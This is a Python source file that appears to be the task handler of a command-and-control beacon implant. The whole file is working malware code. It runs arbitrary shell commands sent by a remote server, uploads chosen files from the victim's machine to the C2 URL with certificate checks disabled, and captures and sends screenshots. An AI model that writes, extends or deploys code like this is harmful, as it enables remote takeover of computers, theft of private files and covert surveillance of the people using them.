# beacon_task_handler.py
import subprocess
import requests
import os
import base64

try:
    import mss  # for screenshot support
except ImportError:
    mss = None

def handle_task(task, UID, C2_URL, ENABLED_MODULES):
    """
    Dispatch and execute tasks based on module name and args.
    """
    if not task:
        return "[*] No task provided."

    module = task.get("module", "").strip().lower()
    args = task.get("args", None)

    if module not in ENABLED_MODULES:
        return f"[!] Module '{module}' is not enabled in beacon config."

    if module == "shell":
        return execute_command(args)

    elif module == "upload":
        return upload_file(args, UID, C2_URL)

    elif module == "screenshot":
        return take_screenshot(UID, C2_URL)

    elif module == "kill":
        exit(0)

    else:
        return f"[!] Unknown module '{module}'"

# === Shell Command Execution ===
def execute_command(cmd):
    if not cmd:
        return "[!] No command provided for shell execution."
    try:
        result = subprocess.getoutput(cmd)
        return result if result else "[*] Command executed with no output."
    except Exception as e:
        return f"[!] Shell error: {str(e)}"

# === File Upload ===
def upload_file(path, UID, C2_URL):
    if not os.path.isfile(path):
        return f"[!] File not found: {path}"
    try:
        with open(path, "rb") as f:
            files = {"file": (os.path.basename(path), f)}
            r = requests.post(f"{C2_URL}/upload/{UID}", files=files, verify=False)
            return f"[+] File '{path}' uploaded. Server response: {r.status_code}"
    except Exception as e:
        return f"[!] Upload error: {str(e)}"

# === Screenshot ===
def take_screenshot(UID, C2_URL):
    if not mss:
        return "[!] Screenshot module requires 'mss'. Run: pip install mss"
    try:
        with mss.mss() as sct:
            path = sct.shot(output="screen.png")
        with open(path, "rb") as f:
            files = {"file": ("screen.png", f)}
            r = requests.post(f"{C2_URL}/upload/{UID}", files=files, verify=False)
        os.remove(path)
        return f"[+] Screenshot captured and uploaded. Status: {r.status_code}"
    except Exception as e:
        return f"[!] Screenshot error: {str(e)}"
